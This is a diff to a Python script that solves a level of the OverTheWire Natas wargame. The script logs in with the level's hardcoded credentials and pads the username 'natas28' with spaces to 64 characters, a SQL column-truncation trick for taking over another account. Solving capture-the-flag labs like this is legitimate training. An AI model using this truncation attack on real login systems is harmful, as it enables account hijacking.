@@ -6,7 +6,7 @@ password = "PSO8xysPi00WKIiZZ6s6PtRmFy9cbxj3"
 url = "http://%s.natas.labs.overthewire.org/" % username
 
 SPACE = " "
-SPACES = 100
+SPACES = 1
 
 def log_in(s, data):
 	r = s.post(url, auth=(username, password), data=data, cookies={})
@@ -17,15 +17,15 @@ def log_in(s, data):
 
 s = req.session()
 
-u = "user1"
+u = "natas28"
 p = ""
 
 for i in range(0, 1):
+	"""
 	data = {"username": u, "password": "secret"}
 	log_in(s, data)
-	data = {"username": u + SPACE * SPACES + "x", "password": p}
+	"""
+	data = {"username": u + SPACE * (64-len(u)) + "x", "password": ""}
 	log_in(s, data)
-	data = {"username": u, "password": p}
-	r = log_in(s, data)
-	if "Wrong password" not in r.text:
-		break
+	data = {"username": u + SPACE * (64-len(u)), "password": ""}
+	log_in(s, data)
